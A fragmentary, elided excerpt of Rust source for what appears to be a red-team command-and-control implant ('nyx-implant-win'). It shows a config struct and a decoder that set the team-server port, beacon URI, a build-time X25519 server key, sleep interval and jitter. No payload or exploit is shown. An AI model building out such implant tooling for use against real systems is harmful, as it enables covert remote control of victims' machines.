...
/// separately by `build.rs` (into `server_pub::SERVER_PUB`, included below); it
/// lives here so the beacon loop has one place to read the full
...
/// `config_placeholder::ImplantConfig` (in the shell crate `nyx-implant-win`,
/// which sits above this core layer in the crate DAG).
pub struct Config {
...
// Team server long-term pubkey, baked at build time by this crate's build.rs
// (H7). A real engagement sets NYX_SERVER_PUB; dev builds fall back to a marked
// test key. Either way it is a valid (non-identity) X25519 point so the ECDH
// no longer collapses and session keys are genuinely derived. Moved from the
// shell crate (nyx-implant-win) in the WP-C crate split: `Config::decode`
// consumes it, so the bake + include live in the same crate as their only
// consumer (core must not depend on the shell).
mod server_pub {
...
pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
    ...
    Ok(Config {
        ...
        server_port,
        beacon_uri,
        server_pub: server_pub::SERVER_PUB,
        sleep_seconds,
        jitter_pct,
